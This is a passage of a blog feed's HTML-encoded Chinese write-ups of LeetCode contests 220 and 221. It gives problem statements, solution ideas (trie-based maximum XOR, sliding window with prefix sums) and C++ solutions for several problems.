&#125;<span class="keyword">else</span> <span class="keyword">if</span>(grid[x][y+<span class="number">1</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">                            t = <span class="number">0</span>;</span><br><span class="line">                            y++;</span><br><span class="line">                        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(grid[x][y+<span class="number">1</span>] == <span class="number">-1</span>)&#123;</span><br><span class="line">                            ans[i] = <span class="number">-1</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(y<span class="number">-1</span> &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                            ans[i] = <span class="number">-1</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(grid[x][y<span class="number">-1</span>] == <span class="number">-1</span>)&#123;</span><br><span class="line">                            t = <span class="number">0</span>;</span><br><span class="line">                            y--;</span><br><span class="line">                        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(grid[x][y<span class="number">-1</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">                            ans[i] = <span class="number">-1</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(ans[i] == <span class="number">0</span>) ans[i] = y;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5640-与数组中元素的最大异或值"><a href="#5640-与数组中元素的最大异或值" class="headerlink" title="5640. 与数组中元素的最大异或值"></a>5640. 与数组中元素的最大异或值</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给你一个由非负整数组成的数组 <code>nums</code> 。另有一个查询数组 <code>queries</code>，其中 <code>queries[i] = [xi, mi]</code>。</p><p>第 i 个查询的答案是 xi 和任何 nums 数组中不超过 mi 的元素按位异或（XOR）得到的最大值。换句话说，答案是 max(nums[j] XOR xi) ，其中所有 j 均满足 nums[j] &lt;= mi 。如果 nums 中的所有元素都大于 mi，最终答案就是 -1 。</p><p>返回一个整数数组 <code>answer</code> 作为查询的答案，其中 <code>answer.length == queries.length</code> 且 <code>answer[i]</code>是第 i 个查询的答案。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>], queries = [[<span class="number">3</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">5</span>,<span class="number">6</span>]]</span><br><span class="line">输出：[<span class="number">3</span>,<span class="number">3</span>,<span class="number">7</span>]</span><br><span class="line">解释：</span><br><span class="line"><span class="number">1</span>) <span class="number">0</span> 和 <span class="number">1</span> 是仅有的两个不超过 <span class="number">1</span> 的整数。<span class="number">0</span> XOR <span class="number">3</span> = <span class="number">3</span> 而 <span class="number">1</span> XOR <span class="number">3</span> = <span class="number">2</span> 。二者中的更大值是 <span class="number">3</span> 。</span><br><span class="line"><span class="number">2</span>) <span class="number">1</span> XOR <span class="number">2</span> = <span class="number">3.</span></span><br><span class="line"><span class="number">3</span>) <span class="number">5</span> XOR <span class="number">2</span> = <span class="number">7.</span></span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">5</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">3</span>], queries = [[<span class="number">12</span>,<span class="number">4</span>],[<span class="number">8</span>,<span class="number">1</span>],[<span class="number">6</span>,<span class="number">3</span>]]</span><br><span class="line">输出：[<span class="number">15</span>,<span class="number">-1</span>,<span class="number">5</span>]</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= nums.length, queries.length &lt;= 105</code></li><li><code>queries[i].length == 2</code></li><li><code>0 &lt;= nums[j], xi, mi &lt;= 109</code></li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/maximum-xor-with-an-element-from-array" target="_blank" rel="noopener">https://leetcode-cn.com/problems/maximum-xor-with-an-element-from-array</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> trie</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>该题题目不错，确实是非常新颖的题目类型，第一次见到此类型应用的题目。</li><li>我们可以将所有小于$m_{i}$的数建立字典树，然后利用字典树的特性和异或的特性，从高到底遍历当前$x_{i}$的所有位，尽量寻找与它的每一位不同的路径去搜索<code>trie</code>，这样不同的位，保证异或的结果为最大值,第一次见到<code>trie</code>树这样的用法，用在异或的搜索上。</li><li>时间复杂度为$O(32*2n)$,空间复杂度位$O(32n)$.<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>&#123;</span></span><br><span class="line">    TrieNode *next[<span class="number">2</span>];</span><br><span class="line">    TrieNode()&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;next[<span class="number">0</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">this</span>-&gt;next[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">insertTrie</span><span class="params">(TrieNode * root,<span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!root) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        TrieNode * node = root;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;val&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">30</span>; i &gt;= <span class="number">0</span>; --i)&#123;</span><br><span class="line">            <span class="keyword">int</span> x = ((val&amp;(<span class="number">1</span>&lt;&lt;i))&gt;&gt;i);</span><br><span class="line">            <span class="keyword">if</span>(!node-&gt;next[x])&#123;</span><br><span class="line">                node-&gt;next[x] = <span class="keyword">new</span> TrieNode();</span><br><span class="line">            &#125;</span><br><span class="line">            node = node-&gt;next[x];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; maximizeXor(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; B) &#123;</span><br><span class="line">        <span class="keyword">int</span> m = A.size();</span><br><span class="line">        <span class="keyword">int</span> n = B.size();</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans(n);</span><br><span class="line">        TrieNode * root = <span class="keyword">new</span> TrieNode();</span><br><span class="line">        </span><br><span class="line">        sort(A.begin(),A.end());</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            B[i].push_back(i);</span><br><span class="line">        &#125;</span><br><span class="line">        sort(B.begin(),B.end(),[&amp;](<span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; a,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; b)&#123;</span><br><span class="line">           <span class="keyword">return</span> a[<span class="number">1</span>] &lt; b[<span class="number">1</span>]; </span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> curr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">while</span>(curr &lt; m &amp;&amp; A[curr] &lt;= B[i][<span class="number">1</span>])&#123;</span><br><span class="line">                insertTrie(root,A[curr]);</span><br><span class="line">                curr++;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(curr == <span class="number">0</span>)&#123;</span><br><span class="line">                ans[B[i][<span class="number">2</span>]] = <span class="number">-1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">int</span> val = <span class="number">0</span>;</span><br><span class="line">                TrieNode * node = root;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">30</span>; j &gt;= <span class="number">0</span>; --j)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(B[i][<span class="number">0</span>]&amp;(<span class="number">1</span>&lt;&lt;j))&#123;</span><br><span class="line">                        <span class="keyword">if</span>(node-&gt;next[<span class="number">0</span>])&#123;</span><br><span class="line">                            val += (<span class="number">1</span>&lt;&lt;j);</span><br><span class="line">                            node = node-&gt;next[<span class="number">0</span>];</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            node = node-&gt;next[<span class="number">1</span>];</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(node-&gt;next[<span class="number">1</span>])&#123;</span><br><span class="line">                            val += (<span class="number">1</span>&lt;&lt;j);</span><br><span class="line">                            node = node-&gt;next[<span class="number">1</span>];</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            node = node-&gt;next[<span class="number">0</span>];</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ans[B[i][<span class="number">2</span>]] = val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-contest-221&quot;&gt;&lt;a href=&quot;#leetcode-contest-221&quot; class=&quot;headerlink&quot; title=&quot;leetcode  contest 221&quot;&gt;&lt;/a&gt;leetcode  contest 221&lt;/h1&gt;&lt;p&gt;本周的题目整体难度非常不错，刚好适合用于面试，最后一题确实是非常有意思的题目，虽然没有做出来，但是感觉这个题目出的相当不错。&lt;/p&gt;&lt;h2 id=&quot;5621-无法吃午餐的学生数量&quot;&gt;&lt;a href=&quot;#5621-无法吃午餐的学生数量&quot; class=&quot;headerlink&quot; title=&quot;5621. 无法吃午餐的学生数量&quot;&gt;&lt;/a&gt;5621. 无法吃午餐的学生数量&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;学校的自助午餐提供圆形和方形的三明治，分别用数字 &lt;code&gt;0&lt;/code&gt;和 &lt;code&gt;1&lt;/code&gt; 表示。所有学生站在一个队列里，每个学生要么喜欢圆形的要么喜欢方形的。&lt;br&gt;餐厅里三明治的数量与学生的数量相同。所有三明治都放在一个 栈 里，每一轮：&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】  Contest 220</title>
    <link href="http://yoursite.com/2020/12/20/236/"/>
    <id>http://yoursite.com/2020/12/20/236/</id>
    <published>2020-12-20T12:46:56.761Z</published>
    <updated>2020-12-20T13:30:34.542Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-contest-220"><a href="#leetcode-contest-220" class="headerlink" title="leetcode  contest 220"></a>leetcode  contest 220</h1><p>本周的题目整体难度不大，<code>hard</code>难度水平不高，但是需要优化，集合合并和查找时需要优化，否则容易出现超时。</p><h2 id="5629-重新格式化电话号码"><a href="#5629-重新格式化电话号码" class="headerlink" title="5629. 重新格式化电话号码"></a>5629. 重新格式化电话号码</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给你一个字符串形式的电话号码 number 。number 由数字、空格 ‘ ‘、和破折号 ‘-‘ 组成。</p><p>请你按下述方式重新格式化电话号码。</p><a id="more"></a><p>首先，删除 所有的空格和破折号。<br>其次，将数组从左到右 每 3 个一组 分块，直到 剩下 4 个或更少数字。剩下的数字将按下述规定再分块：</p><ul><li>2 个数字：单个含 2 个数字的块。</li><li>3 个数字：单个含 3 个数字的块。</li><li>4 个数字：两个分别含 2 个数字的块。<br>最后用破折号将这些块连接起来。注意，重新格式化过程中 不应该 生成仅含 1 个数字的块，并且 最多 生成两个含 2 个数字的块。</li></ul><p>返回格式化后的电话号码。</p><p>示例 1：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：number = <span class="string">"1-23-45 6"</span></span><br><span class="line">输出：<span class="string">"123-456"</span></span><br><span class="line">解释：数字是 <span class="string">"123456"</span></span><br><span class="line">步骤 <span class="number">1</span>：共有超过 <span class="number">4</span> 个数字，所以先取 <span class="number">3</span> 个数字分为一组。第 <span class="number">1</span> 个块是 <span class="string">"123"</span> 。</span><br><span class="line">步骤 <span class="number">2</span>：剩下 <span class="number">3</span> 个数字，将它们放入单个含 <span class="number">3</span> 个数字的块。第 <span class="number">2</span> 个块是 <span class="string">"456"</span> 。</span><br><span class="line">连接这些块后得到 <span class="string">"123-456"</span> 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：number = <span class="string">"123 4-567"</span></span><br><span class="line">输出：<span class="string">"123-45-67"</span></span><br><span class="line">解释：数字是 <span class="string">"1234567"</span>.</span><br><span class="line">步骤 <span class="number">1</span>：共有超过 <span class="number">4</span> 个数字，所以先取 <span class="number">3</span> 个数字分为一组。第 <span class="number">1</span> 个块是 <span class="string">"123"</span> 。</span><br><span class="line">步骤 <span class="number">2</span>：剩下 <span class="number">4</span> 个数字，所以将它们分成两个含 <span class="number">2</span> 个数字的块。这 <span class="number">2</span> 块分别是 <span class="string">"45"</span> 和 <span class="string">"67"</span> 。</span><br><span class="line">连接这些块后得到 <span class="string">"123-45-67"</span> 。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：number = <span class="string">"123 4-5678"</span></span><br><span class="line">输出：<span class="string">"123-456-78"</span></span><br><span class="line">解释：数字是 <span class="string">"12345678"</span> 。</span><br><span class="line">步骤 <span class="number">1</span>：第 <span class="number">1</span> 个块 <span class="string">"123"</span> 。</span><br><span class="line">步骤 <span class="number">2</span>：第 <span class="number">2</span> 个块 <span class="string">"456"</span> 。</span><br><span class="line">步骤 <span class="number">3</span>：剩下 <span class="number">2</span> 个数字，将它们放入单个含 <span class="number">2</span> 个数字的块。第 <span class="number">3</span> 个块是 <span class="string">"78"</span> 。</span><br><span class="line">连接这些块后得到 <span class="string">"123-456-78"</span> 。</span><br></pre></td></tr></table></figure><br>示例 4：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="built_in">number</span> = <span class="string">"12"</span></span><br><span class="line">输出：<span class="string">"12"</span></span><br></pre></td></tr></table></figure><br>示例 5：<br><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：number = "-<span class="string">-17</span><span class="string">-5</span> 229 35<span class="string">-39475</span> "</span><br><span class="line">输出："175<span class="string">-229</span><span class="string">-353</span><span class="string">-94</span><span class="string">-75</span>"</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>2 &lt;= number.length &lt;= 100</code></li><li><code>number</code> 由数字和字符 ‘-‘ 及 ‘ ‘ 组成。</li><li><code>number</code> 中至少含 2 个数字。</li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/reformat-phone-number" target="_blank" rel="noopener">https://leetcode-cn.com/problems/reformat-phone-number</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  简单逻辑即可</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>简单统计即可<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">reformatNumber</span><span class="params">(<span class="built_in">string</span> number)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> curr;</span><br><span class="line">        <span class="built_in">string</span> ans;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c : number)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c &gt;= <span class="string">'0'</span> &amp;&amp; c &lt;= <span class="string">'9'</span>)&#123;</span><br><span class="line">                curr.push_back(c);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> n = curr.size();</span><br><span class="line">        <span class="built_in">string</span> tail = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(n%<span class="number">3</span> == <span class="number">1</span>)&#123;</span><br><span class="line">            tail = curr.substr(n<span class="number">-4</span>,<span class="number">2</span>) + <span class="string">"-"</span> + curr.substr(n<span class="number">-2</span>);</span><br><span class="line">            n -= <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)&#123;</span><br><span class="line">            ans.push_back(curr[i<span class="number">-1</span>]);</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">3</span> == <span class="number">0</span>&amp;&amp;i &lt; curr.size())&#123;</span><br><span class="line">                ans.push_back(<span class="string">'-'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans + tail;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5630-删除子数组的最大得分"><a href="#5630-删除子数组的最大得分" class="headerlink" title="5630. 删除子数组的最大得分"></a>5630. 删除子数组的最大得分</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>给你一个正整数数组 <code>nums</code> ，请你从中删除一个含有 若干不同元素 的子数组。删除子数组的 得分 就是子数组各元素之 和 。</p><p>返回 只删除一个 子数组可获得的 最大得分 。</p><p>如果数组 b 是数组 a 的一个连续子序列，即如果它等于<code>a[l],a[l+1],...,a[r]</code>，那么它就是 a 的一个子数组。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">4</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">输出：<span class="number">17</span></span><br><span class="line">解释：最优子数组是 [<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>]</span><br><span class="line">输出：<span class="number">8</span></span><br><span class="line">解释：最优子数组是 [<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>] 或 [<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>]</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= nums.length &lt;= 105</code></li><li><code>1 &lt;= nums[i] &lt;= 104</code></li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/maximum-erasure-value" target="_blank" rel="noopener">https://leetcode-cn.com/problems/maximum-erasure-value</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 滑动窗口 + 前缀和</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>每次记录当前的最长的非重复子数组的其实位置，然后利用前缀和快速求出当前子数组的和即可。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maximumUniqueSubarray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; sum(n+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            sum[i+<span class="number">1</span>] = sum[i] + nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; cnt;</span><br><span class="line">        <span class="keyword">int</span> curr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            curr = max(curr,cnt[nums[i]]);</span><br><span class="line">            ans = max(ans,sum[i+<span class="number">1</span>]-sum[curr]);</span><br><span class="line">            cnt[nums[i]] = i+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5631-跳跃游戏-VI"><a href="#5631-跳跃游戏-VI" class="headerlink" title="5631. 跳跃游戏 VI"></a>5631. 跳跃游戏 VI</h2><p>给你一个下标从 <code>0</code> 开始的整数数组 <code>nums</code> 和一个整数 <code>k</code> 。</p><p>一开始你在下标 <code>0</code>处。每一步，你最多可以往前跳 k 步，但你不能跳出数组的边界。也就是说，你可以从下标 <code>i</code>跳到<code>[i + 1， min(n - 1, i + k)]</code>包含 两个端点的任意位置。</p><p>你的目标是到达数组最后一个位置（下标为<code>n - 1</code> ），你的 得分 为经过的所有数字之和。</p><p>请你返回你能得到的 最大得分 。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-2</span>,<span class="number">4</span>,<span class="number">-7</span>,<span class="number">3</span>], k = <span class="number">2</span></span><br><span class="line">输出：<span class="number">7</span></span><br><span class="line">解释：你可以选择子序列 [<span class="number">1</span>,<span class="number">-1</span>,<span class="number">4</span>,<span class="number">3</span>] （上面加粗的数字），和为 <span class="number">7</span> 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">10</span>,<span class="number">-5</span>,<span class="number">-2</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">3</span>], k = <span class="number">3</span></span><br><span class="line">输出：<span class="number">17</span></span><br><span class="line">解释：你可以选择子序列 [<span class="number">10</span>,<span class="number">4</span>,<span class="number">3</span>] （上面加粗数字），和为 <span class="number">17</span> 。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">-5</span>,<span class="number">-20</span>,<span class="number">4</span>,<span class="number">-1</span>,<span class="number">3</span>,<span class="number">-6</span>,<span class="number">-3</span>], k = <span class="number">2</span></span><br><span class="line">输出：<span class="number">0</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= nums.length, k &lt;= 105</code></li><li><code>-104 &lt;= nums[i] &lt;= 104</code></li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a 